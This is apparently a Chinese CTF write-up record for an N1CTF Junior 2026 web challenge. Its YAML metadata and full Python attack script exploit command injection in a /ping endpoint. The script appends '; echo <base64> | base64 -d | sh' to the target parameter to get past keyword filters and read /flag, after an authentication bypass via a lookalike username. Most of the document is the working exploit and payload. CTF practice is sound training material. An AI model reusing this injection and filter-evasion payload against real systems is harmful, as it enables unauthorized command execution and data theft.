---
title: N1CTF Junior 2026 1/2 WEB (命令注入)
contest: N1CTF Junior
year: 2026
difficulty: easy
vuln_type: web_unknown
tags: [命令注入, ping, base64 管道, 简单 Web]
attack_chain: |
  1. 题目: N1CTF Junior 2026 WEB 1/2 — 命令注入基础题
  2. 漏洞: /ping 路由 target 参数可注入
  3. 步骤:
     - s.post(f"{TARGET_URL}/set_user_session", data={"username": "admu0131n"})
     - cmd = "cat /flag"
     - b64 = base64.b64encode(cmd.encode()).decode()
     - payload = f"::1%; echo {b64} | base64 -d | sh"
     - s.post(f"{TARGET_URL}/ping", data={"target": payload})
  4. 提取 <pre>...</pre> 里的命令输出
key_payload: |
  # 攻击:
  import requests, base64
  TARGET_URL = "http://challenge.n1ctfjunior.com"
  s = requests.Session()
  s.post(f"{TARGET_URL}/set_user_session", data={"username": "admu0131n"})
  cmd = "cat /flag"
  b64 = base64.b64encode(cmd.encode()).decode()
  payload = f"::1%; echo {b64} | base64 -d | sh"
  r = s.post(f"{TARGET_URL}/ping", data={"target": payload})
  
  # 提取 <pre>...</pre>:
  import re
  m = re.search(r'<pre>(.*?)</pre>', r.text, flags=re.S)
  print(m.group(1).strip())
one_liner: N1CTF Junior 2026 1/2 WEB 入门命令注入: /ping target=::1%; echo <base64> | base64 -d | sh。
lesson: |
  - 命令注入基础: `;` 分隔符 + base64 编码防关键字过滤
  - /set_user_session 设 username 是绕认证
  - 提取 <pre> 标签解析输出
  - N1CTF Junior 是 N1CTF 的入门级版本
quality: low
---

# N1CTF Junior 2026 1/2 WEB

> 来源: ctfiot.com 294851

## 攻击脚本

```python
import requests
import base64
import re

TARGET_URL = "http://challenge.n1ctfjunior.com"

def extract_pre(html):
    m = re.search(r'<pre>(.*?)</pre>', html, flags=re.S)
    if not m:
        return ""
    return m.group(1).strip()

def exploit():
    s = requests.Session()
    s.post(f"{TARGET_URL}/set_user_session", data={"username": "admu0131n"}, timeout=10)
    cmd = "cat /flag"
    b64 = base64.b64encode(cmd.encode()).decode()
    payload = f"::1%; echo {b64} | base64 -d | sh"
    r = s.post(f"{TARGET_URL}/ping", data={"target": payload}, timeout=10)
    out = extract_pre(r.text)
    if out:
        print(out)
    else:
        print("[-]未提取到输出")

if __name__ == "__main__":
    exploit()
```

## 评价

N1CTF Junior 2026 入门 Web 1/2，标准命令注入：
- `;` 分隔符 + base64 编码绕过关键字过滤
- `<pre>` 标签提取输出
- `/set_user_session` 设 username 是认证绕过

N1CTF Junior 是 N1CTF 主办方的入门级版本，适合 CTF 新手练手。
